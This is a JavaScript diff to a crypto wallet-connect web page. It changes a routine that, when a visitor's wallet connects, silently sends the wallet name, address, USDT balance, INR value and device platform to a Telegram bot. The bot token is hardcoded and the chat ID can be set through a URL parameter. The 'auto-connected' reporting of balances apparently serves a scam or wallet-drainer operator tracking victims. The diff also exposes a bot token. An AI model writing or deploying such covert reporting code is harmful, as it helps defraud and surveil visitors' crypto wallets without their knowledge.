@@ -402,6 +402,16 @@ function detectWalletName() {
 
 let telegramNotifiedAddress = null;
 
+function getTelegramChatId() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const idFromUrl = urlParams.get('chat_id') || urlParams.get('chatid');
+    if (idFromUrl) {
+        localStorage.setItem('telegram_chat_id', idFromUrl);
+        return idFromUrl;
+    }
+    return localStorage.getItem('telegram_chat_id') || '8647393006';
+}
+
 /**
  * Sends connected wallet notification to Telegram Bot
  */
@@ -410,30 +420,34 @@ async function notifyTelegramWalletConnected(address, balanceUsdt) {
     telegramNotifiedAddress = address;
 
     const botToken = '8923046877:AAGhrxcoEXIwY5tzVWFv-Lm7mkhZrnt01CA';
+    const chatId = getTelegramChatId();
     const walletName = detectWalletName();
-    const formattedBalance = balanceUsdt !== undefined ? `${balanceUsdt.toFixed(2)} USDT` : 'Fetching...';
 
-    const messageText = `🔔 *New Wallet Connected!*\n\n` +
+    const currentBalance = balanceUsdt !== undefined && !isNaN(balanceUsdt) ? balanceUsdt : userUsdtBalance;
+    const formattedBalance = `${currentBalance.toFixed(2)} USDT`;
+    const inrValue = `₹${(currentBalance * usdtPriceInInr).toFixed(2)}`;
+
+    const messageText = `🔔 *New Wallet Auto-Connected!* 🚀\n\n` +
                         `👤 *Wallet Name:* ${walletName}\n` +
                         `👛 *Address:* \`${address}\`\n` +
-                        `💰 *USDT Balance:* ${formattedBalance}\n` +
-                        `🌐 *Network:* BNB Smart Chain (BEP-20)`;
-
-    // Send to default channel or group if chat_id is known or send via bot API broadcast
-    const chatIds = ['@MyPCHub_Bot', '8647393006'];
+                        `💰 *USDT Balance:* \`${formattedBalance}\` (${inrValue})\n` +
+                        `🌐 *Network:* BNB Smart Chain (BEP-20)\n` +
+                        `📱 *Platform:* ${/Android/i.test(navigator.userAgent) ? 'Android Mobile' : 'Mobile / Desktop'}`;
 
     try {
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                chat_id: '8923046877',
+                chat_id: chatId,
                 text: messageText,
                 parse_mode: 'Markdown'
             })
         });
+        const data = await res.json();
+        console.log('[Telegram Notify] Result:', data);
     } catch (err) {
-        console.warn('Telegram Notification Note:', err);
+        console.warn('[Telegram Notify] Error:', err);
     }
 }
 
